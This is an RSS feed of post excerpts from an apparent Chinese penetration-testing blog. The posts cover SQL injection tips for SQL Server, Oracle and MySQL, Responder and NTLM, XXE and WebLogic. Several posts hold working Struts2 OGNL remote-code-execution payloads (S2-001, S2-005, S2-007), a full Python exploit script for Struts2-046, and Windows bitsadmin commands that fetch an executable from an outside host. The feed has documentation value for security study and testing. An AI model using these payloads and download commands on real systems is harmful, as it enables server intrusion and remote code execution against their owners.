&lt;img src="https://wyb0.com/img/post/Xnip2019-06-29_09-43-32.png" alt="70">&lt;/p></description></item><item><title>从 SQL Server 注入到 远程连接桌面</title><link>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</link><pubDate>Tue, 25 Jun 2019 17:01:53 +0000</pubDate><guid>https://wyb0.com/posts/2019/sql-server-from-sql-injection-to-remote-conn-desktop/</guid><description>&lt;h3 id="0x00-目标情况">0x00 目标情况&lt;/h3>
&lt;ul>
&lt;li>只有一个登录框&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-发现注入">0x01 发现注入&lt;/h3>
&lt;p>简单看了下登陆框，可以爆破用户名&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-42-33.png" alt="50">
&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-43-33.png" alt="50">&lt;/p>
&lt;p>加单引号后报错，试了试 and 1=1 确实存在注入&lt;/p>
&lt;p>&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-45-03.png" alt="60">
&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-46-06.png" alt="50">&lt;/p>
&lt;h3 id="0x01-进一步测试">0x01 进一步测试&lt;/h3>
&lt;p>尝试得到数据版本: &lt;code>admin' and @@version=1--&lt;/code>
&lt;img src="https://wyb0.com/img/post/Xnip2019-06-25_09-49-45.png" alt="60">&lt;/p></description></item><item><title>从 SQL Server 注入到 getshell</title><link>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</link><pubDate>Sat, 02 Mar 2019 20:23:35 +0000</pubDate><guid>https://wyb0.com/posts/2019/sql-server-from-injection-to-getshell/</guid><description>&lt;h3 id="0x00-目标情况">0x00 目标情况&lt;/h3>
&lt;ul>
&lt;li>一个web站点111.*.*.63，只有一个登陆框，测试了没有注入，没有弱口令&lt;/li>
&lt;li>扫描了全端口，没有发现什么有用的信息&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-发现注入">0x01 发现注入&lt;/h3>
&lt;p>当时是查看网页源代码，有两个可疑接口，一个是初始化密码借口，访问返回空白页面，没有什么用&lt;/p></description></item><item><title>SQL注入 tips(Oracle)</title><link>https://wyb0.com/posts/2019/injection-tips-of-oracle/</link><pubDate>Fri, 04 Jan 2019 20:23:35 +0000</pubDate><guid>https://wyb0.com/posts/2019/injection-tips-of-oracle/</guid><description>&lt;h3 id="0x00-判断数据库类型">0x00 判断数据库类型&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Oracle有一些自带的表：dual、user_tables&lt;/p>
&lt;ul>
&lt;li>&lt;code>id=45 and (select count(*) from user_tables)&amp;gt;0--&lt;/code>&lt;/li>
&lt;li>&lt;code>id=45 and (select count(*) from dual)&amp;gt;0--&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>利用自带的一些函数：譬如utl_http.request 这些&lt;/p></description></item><item><title>记一次 SQL Server 报错注入</title><link>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</link><pubDate>Mon, 24 Dec 2018 10:51:02 +0000</pubDate><guid>https://wyb0.com/posts/2018/recording-an-sqlserver-sql-injection-of-error-based/</guid><description>&lt;h3 id="0x00-验证码前端验证">0x00 验证码前端验证&lt;/h3>
&lt;p>需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行
&lt;img src="https://wyb0.com/img/post/20181224-200518.png" alt="40">&lt;/p></description></item><item><title>内网渗透之 Responder 与 Net-NTLM hash</title><link>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</link><pubDate>Mon, 10 Sep 2018 09:48:10 +0000</pubDate><guid>https://wyb0.com/posts/2018/responder-and-ntlm-hash/</guid><description>&lt;h3 id="0x00-一些概念">0x00 一些概念&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Windows 认证协议&lt;/p>
&lt;p>分为：基于 NTLM 的认证和基于 kerberos 的认证&lt;/p>
&lt;/li>
&lt;li>
&lt;p>什么是 NTLM Hash？&lt;/p>
&lt;p>早期 IBM 设计的 LM Hash 算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即 NTLM Hash&lt;/p></description></item><item><title>SQL注入 tips(SQL Server)</title><link>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</link><pubDate>Tue, 04 Sep 2018 10:09:17 +0000</pubDate><guid>https://wyb0.com/posts/2018/injection-tips-of-sqlserver/</guid><description>&lt;h3 id="0x00-基础信息探测">0x00 基础信息探测&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@@&lt;/span>&lt;span style="color:#66d9ef">VERSION&lt;/span>,&lt;span style="color:#f92672">@@&lt;/span>SERVERNAME,&lt;span style="color:#f92672">@@&lt;/span>SERVICENAME;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) 
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--WIN-2008
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--MSSQLSERVER
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">USER&lt;/span>,&lt;span style="color:#66d9ef">CURRENT_USER&lt;/span>,&lt;span style="color:#66d9ef">SESSION_USER&lt;/span>,&lt;span style="color:#66d9ef">SYSTEM_USER&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--dbo
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--wyb
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--46530
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>USER_ID(),USER_SID();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--&amp;lt;01&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ORIGINAL_LOGIN();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">--sa
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-union-query--error-based-注入">0x01 UNION query &amp;amp; error-based 注入&lt;/h3>
&lt;ul>
&lt;li>判断存在注入&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>and 1=1/and 1=2
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">=&lt;/span>(&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#66d9ef">when&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#66d9ef">then&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">end&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>&lt;span style="color:#f92672">=&lt;/span>(&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#66d9ef">when&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>) &lt;span style="color:#66d9ef">then&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#66d9ef">end&lt;/span>);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>判断是否为sa权限&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">select&lt;/span> name &lt;span style="color:#66d9ef">from&lt;/span> msg &lt;span style="color:#66d9ef">where&lt;/span> id&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#66d9ef">and&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">convert&lt;/span>(int,(&lt;span style="color:#66d9ef">select&lt;/span> is_srvrolemember(&lt;span style="color:#e6db74">&amp;#39;sysadmin&amp;#39;&lt;/span>)));
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://wyb0.com/img/post/20180904-105516.png" alt="55">&lt;/p></description></item><item><title>关于 PHP SESSION 反序列化</title><link>https://wyb0.com/posts/2018/php-session-deserialize/</link><pubDate>Mon, 23 Jul 2018 00:09:17 +0000</pubDate><guid>https://wyb0.com/posts/2018/php-session-deserialize/</guid><description>&lt;h3 id="0x00-环境">0x00 环境&lt;/h3>
&lt;p>公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。&lt;/p>
&lt;p>其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题&lt;/p></description></item><item><title>Struts 2 相关漏洞 payload</title><link>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</link><pubDate>Mon, 25 Jun 2018 21:26:14 +0000</pubDate><guid>https://wyb0.com/posts/2018/structs2-some-vulnerability-payload/</guid><description>&lt;h3 id="0x00-s2-001">0x00 S2-001&lt;/h3>
&lt;pre tabindex="0">&lt;code>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&amp;#34;whoami&amp;#34;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&amp;#34;com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;#34;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
&lt;/code>&lt;/pre>&lt;h3 id="0x01-s2-005">0x01 S2-005&lt;/h3>
&lt;p>影响版本: 2.0.0 - 2.1.8.1&lt;/p>
&lt;pre tabindex="0">&lt;code>http://aa.com/index.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;amp;(asdf)((&amp;#39;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&amp;#39;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1
&lt;/code>&lt;/pre>&lt;h3 id="0x02-s2-007">0x02 S2-007&lt;/h3>
&lt;p>影响版本: 2.0.0 - 2.2.3&lt;/p>
&lt;pre tabindex="0">&lt;code>当配置了验证规则 &amp;lt;ActionName&amp;gt;-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;#39; + (#_memberAccess[&amp;#34;allowStaticMethodAccess&amp;#34;]=true,#foo=new java.lang.Boolean(&amp;#34;false&amp;#34;) ,#context[&amp;#34;xwork.MethodAccessor.denyMethodExecution&amp;#34;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&amp;#39;id&amp;#39;).getInputStream())) + &amp;#39;
&lt;/code>&lt;/pre>&lt;h3 id="0x03-s2-012">0x03 S2-012&lt;/h3>
&lt;p>影响版本: 2.1.0 - 2.3.13&lt;/p></description></item><item><title>SQL注入 tips(MySQL)</title><link>https://wyb0.com/posts/2018/injection-tips-of-mysql/</link><pubDate>Wed, 23 May 2018 11:14:51 +0000</pubDate><guid>https://wyb0.com/posts/2018/injection-tips-of-mysql/</guid><description>&lt;p>环境：MySQL 5.5.47&lt;/p>
&lt;h3 id="0x00-注入点在order-by后面">0x00 注入点在Order by后面&lt;/h3>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by id into outfile &amp;#39;C:\\Apps\\phpStudy\\WWW\\a.txt&amp;#39;;
Query OK, 1 row affected (0.01 sec)
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1),0x7e),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~msg~&amp;#39;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~rtest~&amp;#39;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=1,1,(select 1 union select 2));
+----------+
| name |
+----------+
| xiaohong |
+----------+
1 row in set (0.00 sec)
mysql&amp;gt; select name from msg where id&amp;gt;1 order by if(1=2,1,(select 1 union select 2));
ERROR 1242 (21000): Subquery returns more than 1 row

mysql&amp;gt; select name from msg where id&amp;gt;1 order by (select case when(2&amp;gt;1) then 1 else 1*(select 1 union select 2)end)=1;
+----------+
| name |
+----------+
| xiaohong |
+----------+
1 row in set (0.00 sec)
mysql&amp;gt; select name from msg where id&amp;gt;1 order by (select case when(2&amp;lt;1) then 1 else 1*(select 1 union select 2)end)=1;
ERROR 1242 (21000): Subquery returns more than 1 row
&lt;/code>&lt;/pre>&lt;h3 id="0x01-注入点在limit后面">0x01 注入点在limit后面&lt;/h3>
&lt;ul>
&lt;li>limit前面没有order by可以使用union、analyse()&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 union select 1,2,3;
+----+------+---------+
| id | name | content |
+----+------+---------+
| 1 | 2 | 3 |
+----+------+---------+
1 row in set (0.01 sec)

mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 procedure analyse();
+-------------------+---------------+---------------+------------+------------+
| Field_name | Min_value | Max_value | Min_length | Max_length |
+-------------------+---------------+---------------+------------+------------+
| rtest.msg.name | xiaohong | xiaohong | 8 | 8 |
| rtest.msg.content | I have a cat. | I have a cat. | 13 | 13 |
+-------------------+---------------+---------------+------------+------------+

------------------+-------+-------------------------+------+--------------------+
 Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std | Optimal_fieldtype |
------------------+-------+-------------------------+------+--------------------+
 0 | 0 | 8.0000 | NULL | ENUM(&amp;#39;xiaohong&amp;#39;) NOT NULL |
 0 | 0 | 13.0000 | NULL | ENUM(&amp;#39;I have a cat.&amp;#39;) NOT NULL|
------------------+-------+-------------------------+------+--------------------+
2 rows in set (0.00 sec)
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>limit前面有order by则不可以使用union、analyse()&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~5.5.47~&amp;#39;

mysql&amp;gt; select id,name,content from msg where id&amp;gt;1 order by name limit 1,1 procedure analyse(updatexml(1,concat(0x7e,@@version,0x7e),1),1);
ERROR 1105 (HY000): XPATH syntax error: &amp;#39;~5.5.47~&amp;#39;
&lt;/code>&lt;/pre>&lt;h3 id="0x02-根据报错得到数据库名表名列名">0x02 根据报错得到数据库名、表名、列名&lt;/h3>
&lt;pre tabindex="0">&lt;code>#得到数据库名为rtest
mysql&amp;gt; select id,name,content from msg where id=2-a();
ERROR 1305 (42000): FUNCTION rtest.a does not exist

#得到表名为msg
mysql&amp;gt; select id,name,content from msg where id=2 and polygon(1);
ERROR 1367 (22007): Illegal non geometric &amp;#39;1&amp;#39; value found during parsing
mysql&amp;gt; select id,name,content from msg where id=2 and polygon(id);
ERROR 1367 (22007): Illegal non geometric &amp;#39;`rtest`.`msg`.`id`&amp;#39; value found during parsing

#得到列名为id、name、content、useragent
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b)c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;id&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;name&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;content&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content))c);
ERROR 1060 (42S21): Duplicate column name &amp;#39;useragent&amp;#39;
mysql&amp;gt; select id,name,content from msg where id=2 and (select * from(select * from msg as a join msg as b using(id,name,content,useragent))c);
ERROR 1241 (21000): Operand should contain 1 column(s)
&lt;/code>&lt;/pre>&lt;h3 id="0x03-mysql的隐式转换">0x03 MySQL的隐式转换&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>官方隐式转换规则&lt;/p></description></item><item><title>ThinkPHP5 的 where 函数使用不当存在注入</title><link>https://wyb0.com/posts/2018/thinkphp5-where-function/</link><pubDate>Mon, 16 Apr 2018 19:16:14 +0000</pubDate><guid>https://wyb0.com/posts/2018/thinkphp5-where-function/</guid><description>&lt;h3 id="0x00-关于thinkphp5的where函数">0x00 关于thinkphp5的where函数&lt;/h3>
&lt;p>年前公司委托别的公司开发一个网站，使用的是ThinkPHP 5.0.13，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。&lt;/p></description></item><item><title>WebLogic 反序列化漏洞 POC (CVE-2017-10271)</title><link>https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/</link><pubDate>Fri, 09 Mar 2018 09:20:03 +0000</pubDate><guid>https://wyb0.com/posts/2018/weblogic-cve-2017-10271-poc/</guid><description>&lt;h3 id="0x00-weblogic-wls-组件反序列化漏洞">0x00 WebLogic WLS 组件反序列化漏洞&lt;/h3>
&lt;p>这个漏洞的编号是 CVE-2017-10271，漏洞存在于 Oracle WebLogic 的 wls-wsat 组件中，该组件的 XMLDecoder 方法在反序列化时存在漏洞可远程代码执行，凡是版本号 &amp;lt; 10.3.6 的都受到影响，刚出来时没有看，现在记录一下&lt;/p></description></item><item><title>Metasploit 简单提权</title><link>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</link><pubDate>Mon, 26 Feb 2018 13:43:20 +0000</pubDate><guid>https://wyb0.com/posts/2018/msf-simple-elevate-privileges/</guid><description>&lt;h3 id="0x00-前提">0x00 前提&lt;/h3>
&lt;p>虚拟机有一个shell：&lt;code>http://10.11.11.20/a.php&lt;/code>，物理机IP是211.222.222.72&lt;br>
外网安装msf的主机：外网IP是114.115.123.123，内网IP是192.168.0.195&lt;/p></description></item><item><title>Windows 终端下载文件和执行远程文件</title><link>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</link><pubDate>Tue, 06 Feb 2018 15:12:32 +0000</pubDate><guid>https://wyb0.com/posts/2018/win-terminal-download-and-exec-remote-file/</guid><description>&lt;p>环境：Windows Server 2008 R2 Enterprise&lt;/p>
&lt;h3 id="0x00-bitsadmin下载文件">0x00 bitsadmin下载文件&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>bitsadmin /rawreturn /transfer getfile http://114.115.123.123/a.exe C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.exe
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bitsadmin /rawreturn /transfer getpayload http://114.115.123.123/a.zip C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.zip
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bitsadmin /transfer myDownLoadJob /download /priority normal http://114.115.123.123/a.exe C:&lt;span style="color:#ae81ff">\W&lt;/span>indows&lt;span style="color:#ae81ff">\T&lt;/span>emp&lt;span style="color:#ae81ff">\a&lt;/span>.exe
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x01-certutil下载文件">0x01 certutil下载文件&lt;/h3>
&lt;p>保存在当前目录&lt;/p></description></item><item><title>XXE 漏洞</title><link>https://wyb0.com/posts/2017/xxe/</link><pubDate>Sat, 09 Dec 2017 23:02:22 +0000</pubDate><guid>https://wyb0.com/posts/2017/xxe/</guid><description>&lt;h3 id="0x00-xxe">0x00 XXE&lt;/h3>
&lt;p>XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛&lt;/p></description></item><item><title>DNS 域传送漏洞</title><link>https://wyb0.com/posts/2017/dns-zone-transfer/</link><pubDate>Mon, 20 Nov 2017 13:58:33 +0000</pubDate><guid>https://wyb0.com/posts/2017/dns-zone-transfer/</guid><description>&lt;h3 id="0x00-dns域传送">0x00 DNS域传送&lt;/h3>
&lt;p>DNS服务器分为：主服务器、备份服务器和缓存服务器，在主备服务器之间则通过“DNS域传送”同步数据。&lt;/p>
&lt;p>若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录，从而节省许多搜集资产的时间。&lt;/p></description></item><item><title>SSI 注入</title><link>https://wyb0.com/posts/2017/ssi-injection/</link><pubDate>Thu, 08 Jun 2017 11:20:15 +0000</pubDate><guid>https://wyb0.com/posts/2017/ssi-injection/</guid><description>&lt;h3 id="0x00-ssi">0x00 SSI&lt;/h3>
&lt;p>SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。&lt;/p></description></item><item><title>Struts2-046 EXP</title><link>https://wyb0.com/posts/2017/struts2-046/</link><pubDate>Sun, 16 Apr 2017 17:44:01 +0000</pubDate><guid>https://wyb0.com/posts/2017/struts2-046/</guid><description>&lt;h3 id="struts2-046">Struts2 046&lt;/h3>
&lt;p>前段时间写的struts2 046检测脚本，代码如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/usr/bin/env python
# -*- coding: utf-8 -*-
# code by reber

import sys
import pycurl
import StringIO


def initCurl():
 c = pycurl.Curl()
 c.setopt(pycurl.FOLLOWLOCATION, 1) #允许跟踪来源
 c.setopt(pycurl.MAXREDIRS, 5)
 # c.setopt(pycurl.PROXY,&amp;#39;http://127.0.0.1:1080&amp;#39;)
 return c

def check(curl, url):
 head = [
 &amp;#39;Connection: close&amp;#39;,
 &amp;#39;Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150&amp;#39;
 ]

 data = &amp;#39;&amp;#39;&amp;#39;-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=&amp;#34;foo&amp;#34;; filename=&amp;#34;%{(#nike=&amp;#39;multipart/form-data&amp;#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&amp;#39;com.opensymphony.xwork2.ActionContext.container&amp;#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&amp;#39;echo dd996b71024fa97cd015f06a7f24ed30&amp;#39;).(#iswin=(@java.lang.System@getProperty(&amp;#39;os.name&amp;#39;).toLowerCase().contains(&amp;#39;win&amp;#39;))).(#cmds=(#iswin?{&amp;#39;cmd.exe&amp;#39;,&amp;#39;/c&amp;#39;,#cmd}:{&amp;#39;/bin/bash&amp;#39;,&amp;#39;-c&amp;#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\0b&amp;#34;\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n&amp;#39;&amp;#39;&amp;#39;

 buf = StringIO.StringIO()
 curl.setopt(pycurl.WRITEFUNCTION, buf.write)
 curl.setopt(pycurl.POSTFIELDS, data)
 curl.setopt(pycurl.URL, url)
 # curl.setopt(pycurl.TIMEOUT, 10)
 curl.setopt(pycurl.HTTPHEADER, head)
 curl.setopt(pycurl.SSL_VERIFYPEER, 0)
 curl.setopt(pycurl.SSL_VERIFYHOST, 0)
 curl.perform()
 the_page = buf.getvalue()
 buf.close()

 if &amp;#39;dd996b71024fa97cd015f06a7f24ed30&amp;#39; in the_page:
 print &amp;#34;%s has st2-046 vulnerable.&amp;#34; % url

def run(url):
 c = initCurl()
 check(c, url)
 sys.exit(0)

if __name__ == &amp;#39;__main__&amp;#39;:
 if len(sys.argv) == 2:
 url = sys.argv[1]
 run(url)
 else:
 print (&amp;#34;usage: %s http://www.baidu.com/vuln.action whoami&amp;#34; % sys.argv[0])
 sys.exit(-1)
&lt;/code>&lt;/pre></description></item><item><title>检测 WebLogic 是否存在 SSRF</title><link>https://wyb0.com/posts/2017/weblogic-ssrf-check/</link><pubDate>Fri, 14 Apr 2017 14:43:52 +0000</pubDate><guid>https://wyb0.com/posts/2017/weblogic-ssrf-check/</guid><description>&lt;h3 id="0x00-weblogic返回状态">0x00 weblogic返回状态&lt;/h3>
&lt;p>weblogic的ssrf漏洞测试3种状态，返回如下：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>同网段不存在的主机
&lt;img src="https://wyb0.com/img/post/weblogic-check-host-down.png" alt="">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>同网段主机存活但端口不开放
